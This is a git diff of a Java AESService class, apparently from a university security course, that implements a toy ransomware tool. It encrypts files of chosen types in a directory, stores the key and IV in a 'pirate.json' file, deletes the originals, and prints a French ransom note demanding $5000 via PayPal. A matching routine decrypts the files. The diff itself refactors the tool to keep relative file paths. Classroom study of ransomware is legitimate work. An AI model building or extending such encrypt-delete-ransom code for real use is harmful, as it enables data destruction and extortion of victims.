@@ -5,12 +5,9 @@ import ca.ulaval.glo3100.args.FileType;
 import ca.ulaval.glo3100.console.Logger;
 import ca.ulaval.glo3100.utils.*;
 
-import javax.crypto.Cipher;
-import javax.crypto.KeyGenerator;
 import javax.crypto.SecretKey;
 import javax.crypto.spec.IvParameterSpec;
 import java.io.File;
-import java.security.SecureRandom;
 import java.util.Base64;
 import java.util.List;
 import java.util.stream.Collectors;
@@ -43,7 +40,7 @@ public class AESService {
 
         // Get files in directory
         List<File> files = FileUtils.getFiles(directory, fileTypes);
-        List<String> filenames = files.stream().map(file -> file.getName()).collect(Collectors.toList());
+        List<String> filePaths = FileUtils.getRelativePaths(directory, files);
 
         Logger.logDebug(String.format(
                 "Files : %s",
@@ -66,11 +63,11 @@ public class AESService {
         Logger.logDebug(String.format("Save encrypted files to %s", ENCRYPTED_FILES_FILENAME));
 
         // Save key and iv to pirate.json
-        JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv, filenames);
+        JsonUtils.saveEncryptionParams(directory, ENCRYPTION_PARAMS_FILENAME, key, iv, filePaths);
         Logger.logDebug(String.format("Save key and iv to %s", ENCRYPTION_PARAMS_FILENAME));
 
         // Delete files
-        FileUtils.deleteFiles(files);
+        FileUtils.deleteFiles(directory, files);
 
         // Display ransom message
         Logger.logInfo("Cet ordinateur est piraté, plusieurs fichiers ont été chiffrés, une rançon de 5000$ doit être payée sur le compte PayPal hacker@gmail.com pour pouvoir récupérer vos données.");
@@ -101,7 +98,7 @@ public class AESService {
         List<byte[]> decryptedFilesAsBytes = CipherUtils.decrypt(filesAsBytes, key, iv);
 
         // Save files to given directory
-        FileUtils.saveFilesAsBytes(directory, encryptionParams.filenames, decryptedFilesAsBytes);
+        FileUtils.saveFilesAsBytes(directory, encryptionParams.filePaths, decryptedFilesAsBytes);
 
         // Display decryption message
         Logger.logInfo(String.format("Les fichiers ont été déchiffrés dans le répertoire %s", directory));
